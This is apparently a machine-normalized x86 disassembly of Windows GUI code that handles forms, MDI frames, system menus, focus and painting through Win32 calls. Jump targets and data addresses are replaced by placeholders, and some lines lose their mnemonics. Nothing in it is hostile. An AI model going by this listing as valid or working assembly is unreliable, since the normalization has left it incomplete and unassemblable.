je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43fdc8
push eax
mov eax ebx
call sub_43fe0c
push eax
mov eax ebx
call sub_446be4
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406d8c
mov [ ebx + 0x254 ] eax
push ebx
push r-xdata
call sub_420c68
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_450798
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_446be4
push eax
call SetWindowPos
jmp r-xdata
sub_45aca2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45adcd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_443d34
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45d1c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45add4
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_45addc
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_443fa0
push 0x0
mov eax ebx
call sub_446be4
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45ae20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444724
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_446be4
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_446be4
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45ae84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45af2c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af33
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax edi
call sub_457218
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403448
mov eax ebx
call sub_45b23c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403448
test al al
jne r-xdata
sub_45af3c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_443688
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_443688
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45ae84
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45af84
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45ae84
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45afa6
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41a37c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41a2b4
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41a37c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41a2b4
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45b218
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_446be4
mov dx 0xb000
call sub_456fe0
test al al
jne r-xdata
call sub_446be4
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_456fe0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b21f
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a84
jmp r-xdata
call sub_403a84
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_443688
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_446be4
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_456fe0
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_441578
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
call sub_403a84
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_446be4
mov dx 0xb01a
call sub_456fe0
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a84
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_441578
sub_45b23c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_441578
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_446be4
push eax
call SetFocus
mov eax ebx
call sub_446be4
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45b28c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_441578
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45b340
mov eax esi
call sub_45b23c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_44700c
mov edx eax
mov eax esi
call sub_45ae84
sub_45b2f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_459f08
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_441578
mov eax ebx
call sub_459f08
mov edx esi
call sub_45b2f0
sub_45b340
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4542c4
mov edx esi
call sub_4542a8
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45b3e8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_446be4
push eax
call SendMessageA
sub_45b434
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45b3e8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45b464
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45b3e8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45b4ce
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_423b74
xor eax eax
push ebp
push sub_45b57e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_423ee8
xor eax eax
push ebp
push sub_45b55b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403448
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b562
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_423ee8
retn
sub_45b58c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_459f08
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_459f3c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403448
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_445e74
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_459f88
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403448
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45b62c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_446be4
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_446be4
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45b4b4
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_446be4
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_444d3c
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45b6aa
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_423754
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45b70c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_446be4
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_445000
pop edi
pop esi
retn
sub_45b758
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446be4
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45b854
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45b758
pop ecx
sub_45b888
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_441a94
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446be4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_446be4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_440a6c
pop esi
pop ebx
retn
sub_45b918
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_445e00
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_453ce4
sub_45b978
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_444e9c
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_4536f8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45b9c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_453f58
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45b9fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45ba97
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ba9e
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_453658
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460860
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43d528
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460860
jmp r-xdata
sub_45bac4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403448
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45bb04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cf70
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45bb30
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45b2f0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43d300
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45bb88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_445ce4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45f16c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403448
sub_45bc14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_446be4
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_446be4
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_446be4
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45bcac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_446be4
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45b28c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403448
sub_45bd04
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_447118
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45bd30
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45b2f0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45bd4c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_453688
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_453688
sub_45bd8c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45bdc4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403ff0
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45bdf6
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45bf49
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bf50
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45bd4c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43d2a4
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_418ddc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43fedc
lea eax [ ebp - 0x1c ]
call sub_406d5c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45bd4c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
